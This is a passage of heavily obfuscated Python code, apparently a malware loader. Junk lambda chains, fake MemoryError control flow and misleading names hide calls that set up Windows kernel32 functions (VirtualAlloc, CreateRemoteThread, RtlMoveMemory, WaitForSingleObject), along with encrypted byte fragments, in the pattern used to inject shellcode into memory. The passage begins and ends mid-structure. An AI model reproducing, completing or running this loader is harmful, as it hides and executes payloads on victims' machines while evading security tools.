                _14 = [[(lambda: (lambda _16: _16 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1118: _1118 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda: (lambda _718: _718 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _126:
        __4759414074397 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '28' == '314':
        case True:
            raise MemoryError([True])
        case False:
            _135 = [[True], [False]]
            R_E_D__A_V______(['_917'])
    raise MemoryError([True])
except MemoryError as _117:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _24: _24 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _519 = [[(lambda: (lambda _412: _412 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1613: _1613 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _1613: _1613 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _49:
        try:
            raise MemoryError(__4759414074397)
        except MemoryError as __5704936272803:
            if __5704936272803.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.restype = wt.LPVOID
            if __5704936272803.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2870895865269 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xa0\x8a=!j\x1b'))()
try:
    match '1612' == '1219':
        case True:
            raise MemoryError([True])
        case False:
            _139 = [[True], [False]]
            R_E_D__A_V______(['_125'])
    raise MemoryError([True])
except MemoryError as _614:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _164: _164 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _16 = [[(lambda: (lambda _918: _918 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _812: _812 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _1617: _1617 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _183:
        __4521564430216 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1011' == '111':
        case True:
            raise MemoryError([True])
        case False:
            _811 = [[True], [False]]
            R_E_D__A_V______(['_1210'])
    raise MemoryError([True])
except MemoryError as _714:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _318: _318 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _183 = [[(lambda: (lambda _613: _613 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _618: _618 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _816: _816 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _96:
        __4521564430216 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '128' == '54':
        case True:
            raise MemoryError([True])
        case False:
            _48 = [[True], [False]]
            R_E_D__A_V______(['_718'])
    raise MemoryError([True])
except MemoryError as _310:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1310: _1310 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _32 = [[(lambda: (lambda _195: _195 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _918: _918 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _1614: _1614 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _610:
        try:
            raise MemoryError(__4521564430216)
        except MemoryError as __5513100566517:
            if __5513100566517.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
            if __5513100566517.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6203545255076 = (lambda: R_E_D__A_V(b'R_E_D__A_V__py\xa3/\n\xd2'))()
            if __5513100566517.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __8091058098128 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xa9\xc6T\x10%\x18'))()
            if __5513100566517.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __4691179557950 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x80\x81O\xcc\x81h'))()
try:
    match '108' == '16':
        case True:
            raise MemoryError([True])
        case False:
            _148 = [[True], [False]]
            R_E_D__A_V______(['_169'])
    raise MemoryError([True])
except MemoryError as _119:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _318: _318 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _174 = [[(lambda: (lambda _715: _715 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _35: _35 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _1316: _1316 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1318:
        __5669268657146 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '819' == '1719':
        case True:
            raise MemoryError([True])
        case False:
            _616 = [[True], [False]]
            R_E_D__A_V______(['_12'])
    raise MemoryError([True])
except MemoryError as _45:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1911: _1911 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _41 = [[(lambda: (lambda _718: _718 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _114: _114 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _1113: _1113 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _35:
        __5669268657146 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1714' == '114':
        case True:
            raise MemoryError([True])
        case False:
            _311 = [[True], [False]]
            R_E_D__A_V______(['_129'])
    raise MemoryError([True])
except MemoryError as _1518:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _124: _124 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _175 = [[(lambda: (lambda _411: _411 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _167: _167 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _1015: _1015 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1513:
        try:
            raise MemoryError(__5669268657146)
        except MemoryError as __8061069993865:
            if __8061069993865.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.restype = wt.HANDLE
            if __8061069993865.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __4441292565154 = (lambda: R_E_D__A_V(b'R_E_D__A_V__Nrj\xab\xf3\xc7'))()
            if __8061069993865.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2249545105058 = (lambda: R_E_D__A_V(b'R_E_D__A_V__?;+\xd6\x1e\xdf'))()
            if __8061069993865.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __2084538900888 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x80\xfd/\xa3\xd3\xb2'))()
            if __8061069993865.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __6763637924165 = (lambda: R_E_D__A_V(b'R_E_D__A_V__s\xfa\x8e\xe3O_'))()
try:
    match '128' == '918':
        case True:
            raise MemoryError([True])
        case False:
            _24 = [[True], [False]]
            R_E_D__A_V______(['_56'])
    raise MemoryError([True])
except MemoryError as _412:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _65: _65 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _153 = [[(lambda: (lambda _162: _162 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _24: _24 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _101: _101 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1815:
        __2093929137402 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '613' == '1413':
        case True:
            raise MemoryError([True])
        case False:
            _84 = [[True], [False]]
            R_E_D__A_V______(['_56'])
    raise MemoryError([True])
except MemoryError as _78:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _916: _916 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _719 = [[(lambda: (lambda _128: _128 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _129: _129 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _136: _136 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _123:
        __2093929137402 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '193' == '135':
        case True:
            raise MemoryError([True])
        case False:
            _169 = [[True], [False]]
            R_E_D__A_V______(['_14'])
    raise MemoryError([True])
except MemoryError as _95:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _114: _114 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _98 = [[(lambda: (lambda _317: _317 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _414: _414 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _172: _172 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1716:
        try:
            raise MemoryError(__2093929137402)
        except MemoryError as __8378315411993:
            if __8378315411993.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
            if __8378315411993.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2151311303776 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xc6\x0b\xe1a\xe7\xfc'))()
try:
    match '316' == '91':
        case True:
            raise MemoryError([True])
        case False:
            _103 = [[True], [False]]
            R_E_D__A_V______(['_199'])
    raise MemoryError([True])
except MemoryError as _816:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _103: _103 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _115 = [[(lambda: (lambda _18: _18 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1819: _1819 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _24: _24 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _168:
        __7568962529181 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '162' == '113':
        case True:
            raise MemoryError([True])
        case False:
            _52 = [[True], [False]]
            R_E_D__A_V______(['_147'])
    raise MemoryError([True])
except MemoryError as _152:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _189: _189 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _121 = [[(lambda: (lambda _196: _196 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _119: _119 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _58: _58 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _410:
        __7568962529181 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '117' == '315':
        case True:
            raise MemoryError([True])
        case False:
            _137 = [[True], [False]]
            R_E_D__A_V______(['_167'])
    raise MemoryError([True])
except MemoryError as _84:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _158: _158 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1017 = [[(lambda: (lambda _71: _71 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _316: _316 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _173: _173 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1214:
        try:
            raise MemoryError(__7568962529181)
        except MemoryError as __2334428280174:
            if __2334428280174.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.restype = None
            if __2334428280174.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6005556114461 = (lambda: R_E_D__A_V(b'R_E_D__A_V__SH\\\x876\xfd'))()
            if __2334428280174.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __7067760690360 = (lambda: R_E_D__A_V(b'R_E_D__A_V__&"\x0b>\x01`'))()
            if __2334428280174.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __3772321871548 = (lambda: R_E_D__A_V(b'R_E_D__A_V__<%\xe7Gz\xdd'))()
            if __2334428280174.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __6084479788881 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xcf6\x17\xb0R\x8f'))()
            if __2334428280174.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __4239186143807 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xf5\x92\xf0\xeda\x1c'))()
try:
    match '64' == '131':
        case True:
            raise MemoryError([True])
        case False:
            _1511 = [[True], [False]]
            R_E_D__A_V______(['_1115'])
    raise MemoryError([True])
except MemoryError as _1816:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _81: _81 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1310 = [[(lambda: (lambda _45: _45 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _19: _19 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _85: _85 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _74:
        __6391255260738 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1911' == '189':
        case True:
            raise MemoryError([True])
        case False:
            _417 = [[True], [False]]
            R_E_D__A_V______(['_155'])
    raise MemoryError([True])
except MemoryError as _183:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1512: _1512 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1418 = [[(lambda: (lambda _816: _816 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _61: _61 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda: (lambda _1416: _1416 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _101:
        __6391255260738 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '717' == '115':
        case True:
            raise MemoryError([True])
        case False:
            _516 = [[True], [False]]
            R_E_D__A_V______(['_187'])
    raise MemoryError([True])
except MemoryError as _1113:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _149: _149 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _515 = [[(lambda: (lambda _25: _25 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _188: _188 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _914: _914 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _106:
        try:
            raise MemoryError(__6391255260738)
        except MemoryError as __2181740876795:
            if __2181740876795.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
            if __2181740876795.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7962657606271 = (lambda: R_E_D__A_V(b'R_E_D__A_V__Mzqh\xc8\x0e'))()
try:
    match '1214' == '810':
        case True:
            raise MemoryError([True])
        case False:
            _417 = [[True], [False]]
            R_E_D__A_V______(['_107'])
    raise MemoryError([True])
except MemoryError as _1910:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _514: _514 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _115 = [[(lambda: (lambda _319: _319 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _29: _29 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _716: _716 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _35:
        __7843251511909 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '172' == '167':
        case True:
            raise MemoryError([True])
        case False:
            _28 = [[True], [False]]
            R_E_D__A_V______(['_914'])
    raise MemoryError([True])
except MemoryError as _121:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _183: _183 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _41 = [[(lambda: (lambda _97: _97 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _174: _174 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _1418: _1418 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _78:
        __7843251511909 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '45' == '713':
        case True:
            raise MemoryError([True])
        case False:
            _1418 = [[True], [False]]
            R_E_D__A_V______(['_1619'])
    raise MemoryError([True])
except MemoryError as _34:
    try:
